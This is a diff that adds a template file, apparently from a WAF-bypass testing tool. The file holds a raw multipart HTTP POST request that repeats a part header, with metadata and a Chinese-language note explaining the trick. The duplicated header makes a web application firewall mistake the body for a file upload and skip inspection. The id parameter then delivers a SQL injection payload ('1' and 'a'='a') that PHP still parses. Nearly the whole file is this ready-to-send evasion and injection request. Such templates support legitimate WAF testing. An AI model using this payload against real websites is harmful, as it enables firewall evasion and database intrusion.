@@ -1,0 +1,21 @@
+# @name: multipart双写整个part开头
+# @tags: post,multipart,double,part-header,garbage,php,id,bypass
+# @color: orange
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: multipart_double_part_header
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: 重复整个 part 开头块(--a + Content-Disposition)，PHP 解析出的参数值带有垃圾前缀，WAF 因内层出现 filename= 误判为文件上传而跳过检测。SQL 注入场景需闭合前缀垃圾数据。参考 do9gy multipart Part1 第3条。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data; boundary=a
+
+--a
+Content-Disposition: form-data; name="id"
+--a
+Content-Disposition: form-data; name="id"; filename="1.png"
+
+1' and 'a'='a
+--a--
